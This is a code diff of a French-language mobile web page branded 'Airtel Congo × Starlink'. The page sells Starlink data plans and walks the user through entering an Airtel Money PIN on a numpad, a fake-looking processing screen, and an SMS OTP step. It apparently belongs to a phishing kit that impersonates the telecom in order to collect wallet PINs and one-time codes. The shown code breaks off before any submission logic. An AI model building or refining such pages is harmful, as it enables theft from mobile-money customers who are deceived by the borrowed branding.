@@ -3,104 +3,101 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
-<meta name="theme-color" content="#C2001A">
-<title>Airtel Congo &times; Starlink &mdash; Autoriser le Paiement</title>
+<meta name="theme-color" content="#E40000">
+<title>Airtel Congo × Starlink — Connexion</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700;9..40,800;9..40,900&family=DM+Mono:wght@500;600&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%}
-body{font-family:'DM Sans',system-ui,sans-serif;-webkit-font-smoothing:antialiased;background:#F4EFF4;color:#1C1B1F;display:flex;flex-direction:column;position:fixed;inset:0;width:100%;height:100vh;height:100dvh;overflow:hidden}
+body{font-family:'DM Sans',system-ui,sans-serif;-webkit-font-smoothing:antialiased;background:#F2F2F7;color:#1C1B1F;display:flex;flex-direction:column;position:fixed;inset:0;width:100%;height:100vh;height:100dvh;overflow:hidden}
 button{font-family:inherit;touch-action:manipulation;border:none;background:none;cursor:pointer;outline:none;-webkit-user-select:none;user-select:none}
-input{font-family:inherit;border:none;outline:none;background:none}
 img{display:block;max-width:100%}
 *{-webkit-user-select:none;user-select:none}
 :root{
-  --red:#C2001A;--red-dk:#960014;--red-lt:#FFDAD6;--on-red:#fff;--on-red-cont:#410002;
-  --blue:#1B62B5;--blue-lt:#D6E3FF;
-  --surf:#FFFFFF;--surf-lo:#F7F2FA;--surf-mid:#F3EDF7;--surf-hi:#ECE6F0;
-  --on-surf:#1C1B1F;--on-surf-v:#49454F;
-  --outline:#79747E;--outline-v:#CAC4D0;
-  --err:#B3261E;--ok:#386A20;--ok-cont:#C0EFA4;
-  --r-sm:8px;--r-md:12px;--r-lg:16px;--r-xl:28px;--r-full:999px;
-  --e1:0 1px 2px rgba(0,0,0,.1),0 1px 3px 1px rgba(0,0,0,.07);
-  --e2:0 1px 2px rgba(0,0,0,.12),0 2px 6px 2px rgba(0,0,0,.10);
+  --red:#E40000;--red-dk:#B20000;--red-lt:#FFE5E5;--on-red-cont:#7A0000;
+  --blue:#1B62B5;--blue-lt:#E3EEFF;--on-blue-cont:#001849;
+  --surf:#FFFFFF;--surf-lo:#F7F7F7;--surf-mid:#EFEFEF;--surf-hi:#E5E5E5;
+  --on-surf:#111111;--on-surf-v:#555555;
+  --outline:#999999;--outline-v:#DDDDDD;
+  --gold:#B8860B;--gold-lt:#FFF3CD;--on-gold:#5C4500;
+  --ok:#1A7F37;--ok-lt:#DCFCE7;--ok-cont:#DCFCE7;
+  --err:#D32F2F;
+  --r-sm:8px;--r-md:12px;--r-lg:16px;--r-xl:24px;--r-full:999px;
+  --e1:0 1px 3px rgba(0,0,0,.08),0 1px 2px rgba(0,0,0,.06);
+  --e2:0 4px 12px rgba(0,0,0,.10),0 1px 3px rgba(0,0,0,.06);
   --ease:cubic-bezier(.2,0,0,1);
 }
 @keyframes rip-anim{to{transform:scale(4);opacity:0}}
 @keyframes pg-in{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
 @keyframes spin{to{transform:rotate(360deg)}}
-@keyframes dot-pulse{0%,100%{opacity:1}50%{opacity:.35}}
-/* NAV */
-.nav{flex-shrink:0;background:var(--red);display:flex;align-items:center;justify-content:space-between;padding:0 16px;height:calc(56px + env(safe-area-inset-top,0px));padding-top:env(safe-area-inset-top,0px);box-shadow:var(--e2);z-index:20;position:relative}
-.nav-back{display:flex;align-items:center;gap:6px;color:rgba(255,255,255,.9);font-size:14px;font-weight:600;cursor:pointer;padding:6px 0}
-.nav-back:active{opacity:.7}
-.nav-logos{display:flex;align-items:center;gap:8px}
-.nav-sep{width:1px;height:18px;background:rgba(255,255,255,.28)}
-.nav-right{display:flex;align-items:center;gap:8px}
-.nav-spinner{width:18px;height:18px;border-radius:50%;border:2px solid rgba(255,255,255,.25);border-top-color:#fff;animation:spin 1s linear infinite;display:none;flex-shrink:0}
-.nav-badge{display:flex;align-items:center;gap:5px;background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.22);border-radius:var(--r-full);padding:4px 10px}
-.nav-dot{width:6px;height:6px;border-radius:50%;background:#69FF4D;animation:dot-pulse 2s infinite}
-.nav-badge-txt{font-size:10px;font-weight:700;color:#fff;letter-spacing:.6px;text-transform:uppercase}
-/* STEP BAR — sits on red background */
-.steps{flex-shrink:0;background:var(--red);border-bottom:3px solid var(--red-dk);padding:0 20px 12px;display:flex;align-items:center}
+
+/* ── NAV ─────────────────────────────────────── */
+.nav{flex-shrink:0;background:var(--red);display:flex;align-items:center;justify-content:space-between;padding:0 16px;height:calc(56px + env(safe-area-inset-top,0px));padding-top:env(safe-area-inset-top,0px);z-index:20;box-shadow:0 2px 8px rgba(228,0,0,.3)}
+.nav-brand{display:flex;align-items:center;gap:10px}
+.nav-sep{width:1px;height:20px;background:rgba(255,255,255,.25)}
+
+/* ── STEPS BAR ───────────────────────────────── */
+.steps{flex-shrink:0;background:var(--red);border-bottom:2px solid var(--red-dk);padding:0 20px 12px;display:flex;align-items:center}
 .si{display:flex;flex-direction:column;align-items:center;gap:4px;flex:1;position:relative}
 .si+.si::before{content:'';position:absolute;top:9px;left:calc(-50%);width:100%;height:1.5px;background:rgba(255,255,255,.2);z-index:0}
 .si.done+.si::before,.si.active+.si::before{background:rgba(255,255,255,.5)}
-.si-dot{width:18px;height:18px;border-radius:50%;border:2px solid rgba(255,255,255,.3);background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:rgba(255,255,255,.6);position:relative;z-index:1;transition:all .3s var(--ease)}
-.si.done .si-dot{background:#fff;border-color:#fff;color:var(--red)}
-.si.active .si-dot{background:#fff;border-color:#fff;color:var(--red);box-shadow:0 0 0 3px rgba(255,255,255,.25)}
-.si-lbl{font-size:9px;font-weight:600;color:rgba(255,255,255,.5);letter-spacing:.3px;white-space:nowrap}
-.si.done .si-lbl,.si.active .si-lbl{color:rgba(255,255,255,.9)}
-/* VIEWS */
-.view{display:none;flex-direction:column;flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;overscroll-behavior-y:contain;scrollbar-width:none;animation:pg-in .3s var(--ease) both}
-.view::-webkit-scrollbar{display:none}
+.si-dot{width:18px;height:18px;border-radius:50%;border:2px solid rgba(255,255,255,.3);background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;position:relative;z-index:1;transition:all .25s}
+.si.active .si-dot,.si.done .si-dot{border-color:#fff;background:#fff}
+.si-dot-inner{width:6px;height:6px;border-radius:50%;background:var(--red);transition:all .25s}
+.si.active .si-dot-inner{background:var(--red)}
+.si.done .si-dot-inner{width:10px;height:10px;background:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 10 10'%3E%3Cpath d='M1.5 5l2.5 2.5 4.5-5' stroke='%23E40000' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E") center/contain no-repeat}
+.si-lbl{font-size:9px;font-weight:600;color:rgba(255,255,255,.5);text-align:center;white-space:nowrap;letter-spacing:.1px}
+.si.active .si-lbl,.si.done .si-lbl{color:rgba(255,255,255,.85)}
+
+/* ── VIEWS ───────────────────────────────────── */
+.view{display:none;flex-direction:column;flex:1;min-height:0;animation:pg-in .3s var(--ease) both}
 .view.active{display:flex}
-.content{padding:18px 16px;display:flex;flex-direction:column;gap:16px;flex:1}
-/* BRAND CARD */
-.brand-card{background:var(--surf);border-radius:var(--r-xl);box-shadow:var(--e1);padding:20px;display:flex;flex-direction:column;align-items:center;gap:10px;border-top:3px solid var(--red)}
-.brand-logos{display:flex;align-items:center;gap:12px}
-.brand-x{font-size:14px;font-weight:700;color:var(--on-surf-v)}
-.brand-title{font-size:16px;font-weight:700;color:var(--on-surf);text-align:center}
-.brand-sub{font-size:12px;color:var(--on-surf-v);text-align:center;line-height:1.65;max-width:280px}
-/* FORFAIT CHIP */
-.forfait-chip{background:var(--red-lt);border-radius:var(--r-xl);padding:14px 16px;display:flex;align-items:center;justify-content:space-between;border-left:4px solid var(--red)}
-.fc-tag{font-size:10px;font-weight:700;color:var(--on-red-cont);letter-spacing:.5px;text-transform:uppercase;margin-bottom:3px}
-.fc-val{font-size:17px;font-weight:800;color:var(--red)}
-.fc-change{font-size:12px;font-weight:600;color:var(--outline);text-decoration:underline;cursor:pointer}
-/* FIELD */
-.field{display:flex;flex-direction:column;gap:5px}
-.field-lbl{font-size:11px;font-weight:700;color:var(--on-surf-v);letter-spacing:.5px;text-transform:uppercase}
-.fw{display:flex;align-items:center;background:var(--surf-mid);border-radius:var(--r-lg) var(--r-lg) 0 0;border-bottom:2px solid var(--outline);height:54px;transition:border-color .18s;overflow:hidden}
-.fw.focus{border-bottom-color:var(--red)}
-.fw.ok{border-bottom-color:var(--ok)}
-.fw.err{border-bottom-color:var(--err)}
-.prefix{display:flex;align-items:center;gap:7px;padding:0 12px;border-right:1.5px solid var(--outline-v);height:100%;flex-shrink:0;background:var(--surf-hi)}
-.prefix-flag{font-size:18px;line-height:1}
-.prefix-code{font-size:14px;font-weight:700;color:var(--on-surf);font-family:'DM Mono',monospace}
-.f-input{flex:1;height:100%;padding:0 14px;font-size:16px;font-weight:600;color:var(--on-surf);caret-color:var(--red);background:transparent;-webkit-user-select:text!important;user-select:text!important;font-family:'DM Mono',monospace;letter-spacing:.5px}
-.f-input::placeholder{font-size:13px;font-weight:400;letter-spacing:normal;font-family:'DM Sans',sans-serif;color:var(--outline)}
-.f-err{font-size:11px;color:var(--err);font-weight:600;min-height:16px;padding-top:2px}
-/* PIN — dots only, no peek */
+#viewLogin{overflow:hidden}
+#viewProc,#viewOTP{overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+#viewProc::-webkit-scrollbar,#viewOTP::-webkit-scrollbar{display:none}
+
+/* ── LOGIN SUMMARY STRIP ─────────────────────── */
+.login-fixed{flex:1;min-height:0;display:flex;flex-direction:column;overflow:hidden}
+.login-summary{flex-shrink:0;background:linear-gradient(135deg,var(--red) 0%,var(--red-dk) 100%);padding:12px 16px 14px}
+.ls-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
+.ls-plan-wrap{display:flex;align-items:baseline;gap:10px}
+.ls-plan-data{font-size:24px;font-weight:900;color:#fff;letter-spacing:-.5px}
+.ls-plan-price{font-size:20px;font-weight:800;color:rgba(255,255,255,.7);letter-spacing:-.3px}
+.ls-change{display:flex;align-items:center;gap:4px;font-size:11px;font-weight:600;color:rgba(255,255,255,.7);background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);border-radius:var(--r-full);padding:5px 12px;cursor:pointer}
+.ls-divider{height:1px;background:rgba(255,255,255,.15);margin-bottom:10px}
+.ls-bottom{display:flex;align-items:center;gap:8px;overflow:hidden}
+.ls-info-item{display:flex;align-items:center;gap:4px;min-width:0}
+.ls-info-lbl{font-size:9px;color:rgba(255,255,255,.5);font-weight:600;text-transform:uppercase;letter-spacing:.3px;white-space:nowrap}
+.ls-info-val{font-size:11px;font-weight:700;color:#fff;font-family:'DM Mono',monospace;white-space:nowrap;margin-left:3px}
+.ls-info-dot{width:3px;height:3px;border-radius:50%;background:rgba(255,255,255,.3);flex-shrink:0}
+
+/* ── PIN CENTER ──────────────────────────────── */
+.pin-center{flex:1;min-height:0;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:12px 20px max(12px,env(safe-area-inset-bottom,0px));overflow:hidden}
+.pin-center-title{font-size:17px;font-weight:800;color:var(--on-surf);text-align:center;margin-bottom:4px}
+.pin-center-sub{font-size:12px;color:var(--on-surf-v);text-align:center;line-height:1.55;max-width:280px;margin-bottom:18px}
 .pin-lbl{font-size:11px;font-weight:700;color:var(--on-surf-v);letter-spacing:.5px;text-transform:uppercase}
 .pin-boxes{display:flex;gap:12px;justify-content:center}
 .pb{width:60px;height:60px;border-radius:var(--r-lg);background:var(--surf-mid);border:1.5px solid var(--outline-v);display:flex;align-items:center;justify-content:center;transition:border-color .15s,box-shadow .15s,background .15s;position:relative;overflow:hidden}
-.pb.active{border-color:var(--red);box-shadow:0 0 0 3px rgba(194,0,26,.12);background:#fff}
+.pb.active{border-color:var(--red);box-shadow:0 0 0 3px rgba(228,0,0,.12);background:#fff}
 .pb.filled{border-color:var(--red);background:#fff}
 .pb-dot{border-radius:50%;background:var(--red);transition:width .1s,height .1s}
 .pin-err{font-size:11px;color:var(--err);font-weight:600;min-height:16px;text-align:center}
-/* NUMPAD */
+
+/* ── NUMPAD ──────────────────────────────────── */
 .numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
 .nk{height:56px;border-radius:var(--r-lg);background:var(--surf);border:1px solid var(--outline-v);font-size:20px;font-weight:600;color:var(--on-surf);display:flex;align-items:center;justify-content:center;cursor:pointer;position:relative;overflow:hidden;transition:background .1s;box-shadow:var(--e1);-webkit-user-select:none;user-select:none}
 .nk:active{background:var(--surf-hi);box-shadow:none}
 .nk.del{font-size:17px;color:var(--on-surf-v)}
 .nk.empty{background:transparent;border-color:transparent;box-shadow:none;cursor:default}
-/* PRIMARY BTN */
-.btn-primary{width:100%;height:52px;border-radius:var(--r-full);background:var(--red);color:#fff;font-size:15px;font-weight:800;letter-spacing:.3px;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 2px 14px rgba(194,0,26,.35);position:relative;overflow:hidden;transition:transform .12s,box-shadow .12s,background .15s}
+
+/* ── BTN PRIMARY ─────────────────────────────── */
+.btn-primary{width:100%;height:52px;border-radius:var(--r-full);background:var(--red);color:#fff;font-size:15px;font-weight:800;letter-spacing:.2px;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 2px 12px rgba(228,0,0,.3);position:relative;overflow:hidden;transition:transform .12s,box-shadow .12s}
 .btn-primary:active{transform:scale(.97);box-shadow:none}
 .btn-primary.dim{background:var(--surf-hi);color:var(--outline);box-shadow:none}
-/* PROCESSING */
+
+/* ── PROCESSING ──────────────────────────────── */
 .proc-wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;gap:22px;background:var(--surf-lo)}
 .proc-ring{width:72px;height:72px;border-radius:50%;border:3px solid var(--red-lt);border-top-color:var(--red);animation:spin 1s linear infinite}
 .proc-logos{display:flex;align-items:center;gap:12px}
@@ -117,31 +114,37 @@ img{display:block;max-width:100%}
 .psi-txt{font-size:12px;color:var(--on-surf-v)}
 .psi.act .psi-txt{color:var(--on-surf);font-weight:600}
 .psi.done .psi-txt{color:var(--ok)}
-/* OTP */
+
+/* ── OTP ─────────────────────────────────────── */
+.content{padding:18px 16px;display:flex;flex-direction:column;gap:14px}
+.brand-card{background:var(--surf);border-radius:var(--r-xl);box-shadow:var(--e1);padding:20px;display:flex;flex-direction:column;align-items:center;gap:10px;border-top:3px solid var(--red)}
+.brand-logos{display:flex;align-items:center;gap:12px}
+.brand-x{font-size:14px;font-weight:700;color:var(--on-surf-v)}
+.brand-title{font-size:16px;font-weight:700;color:var(--on-surf);text-align:center}
+.brand-sub{font-size:12px;color:var(--on-surf-v);text-align:center;line-height:1.65;max-width:280px}
 .otp-icon{width:60px;height:60px;border-radius:50%;background:var(--red-lt);border:2px solid var(--red);display:flex;align-items:center;justify-content:center}
 .otp-phone{background:var(--surf-mid);border:1px solid var(--outline-v);padding:5px 16px;border-radius:var(--r-full);font-size:14px;font-weight:700;color:var(--on-surf);font-family:'DM Mono',monospace}
 .otp-boxes{display:flex;gap:12px;justify-content:center}
 .ob{width:64px;height:64px;border-radius:var(--r-xl);background:var(--surf-mid);border:2px solid var(--outline-v);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;color:var(--on-surf);font-family:'DM Mono',monospace;transition:border-color .15s,box-shadow .15s;position:relative;overflow:hidden}
-.ob.active{border-color:var(--red);box-shadow:0 0 0 3px rgba(194,0,26,.15);background:#fff}
+.ob.active{border-color:var(--red);box-shadow:0 0 0 3px rgba(228,0,0,.15);background:#fff}
 .ob.filled{border-color:var(--ok);color:var(--on-surf);background:#fff}
 .ob.success{background:var(--ok-cont);border-color:var(--ok);color:var(--ok)}
 .otp-timer-row{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--on-surf-v)}
 .otp-timer{font-weight:700;color:var(--red);font-family:'DM Mono',monospace;font-feature-settings:'tnum';min-width:18px;display:inline-block;text-align:center}
 .otp-resend{font-size:12px;font-weight:700;color:var(--blue);cursor:pointer;text-decoration:underline}
 .otp-resend.dim{color:var(--outline);text-decoration:none;cursor:default}
-/* CURTAIN */
-.curtain{position:fixed;inset:0;z-index:9999;background:var(--red);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;opacity:0;pointer-events:none;transition:opacity .3s ease}
+
+/* ── CURTAIN ─────────────────────────────────── */
+.curtain{position:fixed;inset:0;z-index:9999;background:var(--red);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;opacity:0;pointer-events:none;transition:opacity .28s ease}
 .curtain.show{opacity:1;pointer-events:all}
 .curtain-logos{display:flex;align-items:center;gap:14px}
-.curtain-x{font-size:18px;font-weight:700;color:rgba(255,255,255,.4)}
-.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.15);transform:scale(0);animation:rip-anim .5s ease forwards}
-
-
+.curtain-x{font-size:18px;font-weight:700;color:rgba(255,255,255,.35)}
+.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(0,0,0,.07);transform:scale(0);animation:rip-anim .5s ease forwards}
 </style>
 </head>
 <body>
 
-<!-- CURTAIN TRANSITION -->
+<!-- CURTAIN -->
 <div class="curtain" id="curtain">
   <div class="curtain-logos">
     <img src="assets/logo.svg" alt="Airtel" height="34" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">
@@ -152,103 +155,94 @@ img{display:block;max-width:100%}
 
 <!-- NAV -->
 <nav class="nav">
-  <div class="nav-back" onclick="goBack()">
-    <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
-    Retour
-  </div>
-  <div class="nav-logos">
+  <div class="nav-brand">
     <img src="assets/logo.svg" alt="Airtel" height="26" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">
     <div class="nav-sep"></div>
     <img src="assets/starlink_logo_with_icon_transparent_black.png" alt="Starlink" height="26" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">
-  </div>
-  <div class="nav-right">
-    <div class="nav-spinner" id="navSpinner"></div>
-    <div class="nav-badge"><div class="nav-dot"></div><span class="nav-badge-txt">S&eacute;curis&eacute;</span></div>
   </div>
 </nav>
 
 <!-- STEP BAR -->
 <div class="steps">
-  <div class="si done" id="sp0"><div class="si-dot">&#10003;</div><div class="si-lbl">Forfait</div></div>
-  <div class="si active" id="sp1"><div class="si-dot">2</div><div class="si-lbl">Connexion</div></div>
-  <div class="si" id="sp2"><div class="si-dot">3</div><div class="si-lbl">Traitement</div></div>
-  <div class="si" id="sp3"><div class="si-dot">4</div><div class="si-lbl">Code OTP</div></div>
+  <div class="si done" id="sp0"><div class="si-dot"><div class="si-dot-inner"></div></div><div class="si-lbl">Forfait</div></div>
+  <div class="si active" id="sp1"><div class="si-dot"><div class="si-dot-inner"></div></div><div class="si-lbl">Connexion</div></div>
+  <div class="si" id="sp2"><div class="si-dot"><div class="si-dot-inner"></div></div><div class="si-lbl">Traitement</div></div>
+  <div class="si" id="sp3"><div class="si-dot"><div class="si-dot-inner"></div></div><div class="si-lbl">Code OTP</div></div>
 </div>
 
-<!-- VIEW: CONNEXION -->
+<!-- VIEW: LOGIN -->
 <div class="view active" id="viewLogin">
-  <div class="content">
+  <div class="login-fixed">
 
-    <!-- Brand card -->
-    <div class="brand-card">
-      <div class="brand-logos">
-        <img src="assets/logo.svg" alt="Airtel" height="28" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">
-        <span class="brand-x">&times;</span>
-        <img src="assets/starlink_logo_with_icon_transparent_black.png" alt="Starlink" height="28" style="filter:brightness(0) invert(1)" onerror="this.style.display='none'">
-      </div>
-      <div class="brand-title">Connexion Airtel Lite</div>
-      <div class="brand-sub">V&eacute;rifiez votre num&eacute;ro et entrez votre code PIN Airtel Money pour autoriser le paiement.</div>
-    </div>
-
-    <!-- Plan summary chip -->
-    <div class="forfait-chip">
-      <div>
-        <div class="fc-tag">Forfait S&eacute;lectionn&eacute;</div>
-        <div class="fc-val" id="forfaitLabel">Chargement&hellip;</div>
-      </div>
-      <div class="fc-change" onclick="goBack()">Modifier</div>
-    </div>
-
-    <!-- Phone — pre-filled read-only from session -->
-    <div class="field">
-      <div class="field-lbl">Num&eacute;ro Airtel Lite&nbsp;<span style="color:var(--err);font-size:16px;font-weight:900;line-height:1;text-transform:none">*</span></div>
-      <div class="fw ok" id="fw-phone">
-        <div class="prefix">
-          <span class="prefix-flag">&#127464;&#127465;</span>
-          <span class="prefix-code">+243</span>
+    <div class="login-summary">
+      <div class="ls-top">
+        <div class="ls-plan-wrap">
+          <div class="ls-plan-data" id="lsPlan">— GB</div>
+          <div class="ls-plan-price" id="lsPrice">$—</div>
         </div>
-        <input class="f-input" id="phoneInput" type="tel" inputmode="numeric" pattern="[0-9]*"
-          placeholder="9X XXX XXXX" maxlength="9" autocomplete="tel-national"
-          style="-webkit-user-select:text!important;user-select:text!important">
-      </div>
-      <div class="f-err" id="phoneErr"></div>
-    </div>
-
-    <!-- PIN -->
-    <div style="display:flex;flex-direction:column;gap:8px">
-      <div style="display:flex;align-items:center;justify-content:space-between">
-        <div class="pin-lbl">Code PIN de S&eacute;curit&eacute; (4 chiffres)</div>
-        <button id="peekBtn" onclick="togglePeek()" style="display:flex;align-items:center;gap:4px;font-size:12px;font-weight:600;color:var(--outline);padding:4px 0;background:none;border:none;cursor:pointer">
-          <svg id="peekIcon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-          <span id="peekTxt">Afficher</span>
+        <button class="ls-change" onclick="goBack()">
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M15 18l-6-6 6-6"/></svg>
+          Modifier
         </button>
       </div>
-      <div class="pin-boxes">
+      <div class="ls-divider"></div>
+      <div class="ls-bottom">
+        <div class="ls-info-item">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.5)" stroke-width="2.5" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3"/></svg>
+          <span class="ls-info-lbl">N&deg;</span>
+          <span class="ls-info-val"><span id="lsPhone">&#127464;&#127465; +243 —</span></span>
+        </div>
+        <div class="ls-info-dot"></div>
+        <div class="ls-info-item">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.5)" stroke-width="2.5" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+          <span class="ls-info-lbl">Validit&eacute;</span>
+          <span class="ls-info-val" id="lsValidity">—</span>
+        </div>
+        <div class="ls-info-dot"></div>
+        <div class="ls-info-item">
+          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.5)" stroke-width="2.5" stroke-linecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          <span class="ls-info-lbl">Paiement</span>
+          <span class="ls-info-val">Airtel Money</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="pin-center">
+      <div class="pin-center-title">Code PIN Airtel Money</div>
+      <div class="pin-center-sub">Entrez votre PIN &agrave; 4 chiffres pour autoriser le paiement de <strong id="pinPriceRef">$—</strong></div>
+
+      <div class="pin-boxes" style="margin-bottom:8px">
         <div class="pb" id="pb0"><div class="pb-dot" id="pd0"></div></div>
         <div class="pb" id="pb1"><div class="pb-dot" id="pd1"></div></div>
         <div class="pb" id="pb2"><div class="pb-dot" id="pd2"></div></div>
         <div class="pb" id="pb3"><div class="pb-dot" id="pd3"></div></div>
       </div>
-      <div class="pin-err" id="pinErr"></div>
+
+      <div style="display:flex;justify-content:center;margin-bottom:12px">
+        <button id="peekBtn" onclick="togglePeek()" style="display:flex;align-items:center;gap:4px;font-size:12px;font-weight:600;color:var(--outline);padding:5px 14px;background:var(--surf-mid);border-radius:var(--r-full);border:none;cursor:pointer">
+          <svg id="peekIcon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+          <span id="peekTxt">Afficher</span>
+        </button>
+      </div>
+
+      <div class="pin-err" id="pinErr" style="margin-bottom:10px"></div>
+
+      <div class="numpad" id="pinPad" style="width:100%;max-width:320px">
+        <button class="nk" data-v="1">1</button><button class="nk" data-v="2">2</button><button class="nk" data-v="3">3</button>
+        <button class="nk" data-v="4">4</button><button class="nk" data-v="5">5</button><button class="nk" data-v="6">6</button>
+        <button class="nk" data-v="7">7</button><button class="nk" data-v="8">8</button><button class="nk" data-v="9">9</button>
+        <button class="nk empty" disabled></button>
+        <button class="nk" data-v="0">0</button>
+        <button class="nk del" id="npDel">&#9003;</button>
+      </div>
+
+      <button class="btn-primary dim" id="loginBtn" onclick="submitLogin()" style="margin-top:14px;width:100%;max-width:320px">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        Autoriser le Paiement
+      </button>
     </div>
-
-    <!-- Numpad -->
-    <div class="numpad" id="pinPad">
-      <button class="nk" data-v="1">1</button><button class="nk" data-v="2">2</button><button class="nk" data-v="3">3</button>
-      <button class="nk" data-v="4">4</button><button class="nk" data-v="5">5</button><button class="nk" data-v="6">6</button>
-      <button class="nk" data-v="7">7</button><button class="nk" data-v="8">8</button><button class="nk" data-v="9">9</button>
-      <button class="nk empty" disabled></button><button class="nk" data-v="0">0</button><button class="nk del" id="npDel">&#9003;</button>
-    </div>
-
-    <!-- Submit -->
-    <button class="btn-primary dim" id="loginBtn" onclick="submitLogin()">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-      Autoriser le Paiement
-    </button>
-
-    <div style="height:8px"></div>
   </div>
-</div><!-- /viewLogin -->
+</div>
 
 <!-- VIEW: TRAITEMENT -->
 <div class="view" id="viewProc">
@@ -315,7 +309,7 @@ img{display:block;max-width:100%}
     </button>
     <div style="height:8px"></div>
   </div>
-</div>
+
 
 <script>
 'use strict';
@@ -328,16 +322,12 @@ function slp(ms){return new Promise(function(r){setTimeout(r,ms);});}
 var forfait={};
 try{forfait=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
 if(!forfait.name){location.href='airtel-index.html';}
-// Fill plan chip
-document.getElementById('forfaitLabel').textContent=(forfait.name||'')+' \u00b7 '+(forfait.price||'');
-// Pre-fill phone from session — read-only style
-var phEl=document.getElementById('phoneInput');
-if(phEl&&forfait.phone){
-  phEl.value=forfait.phone;
-  phEl.readOnly=true;
-  phEl.style.color='var(--on-surf)';
-  phEl.style.opacity='1';
-}
+// Fill summary strip
+document.getElementById('lsPlan').textContent=forfait.name||'—';
+document.getElementById('lsPrice').textContent=forfait.price||'—';
+document.getElementById('lsPhone').innerHTML=forfait.phone?'&#127464;&#127465; +243 '+forfait.phone:'&#127464;&#127465; +243 —';
+document.getElementById('lsValidity').textContent=forfait.jours?(forfait.jours+(forfait.jours===1?' Jour':' Jours')):'—';
+var ppr=document.getElementById('pinPriceRef');if(ppr)ppr.textContent=forfait.price||'—';
 
 function goBack(){location.href='airtel-index.html';}
 
@@ -367,26 +357,7 @@ function togglePeek(){
     ?'<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
     :'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
   renderPIN();
-// Phone field events — allow editing if needed
-var _phEl=document.getElementById('phoneInput');
-if(_phEl){
-  _phEl.addEventListener('focus',function(){document.getElementById('fw-phone').classList.add('focus');});
-  _phEl.addEventListener('blur',function(){
-    document.getElementById('fw-phone').classList.remove('focus');
-    var v=this.value.replace(/[^0-9]/g,'');
-    var fw=document.getElementById('fw-phone');
-    if(v&&v.length!==9){fw.classList.add('err');fw.classList.remove('ok');document.getElementById('phoneErr').textContent='Num\u00e9ro invalide \u2014 9 chiffres requis';}
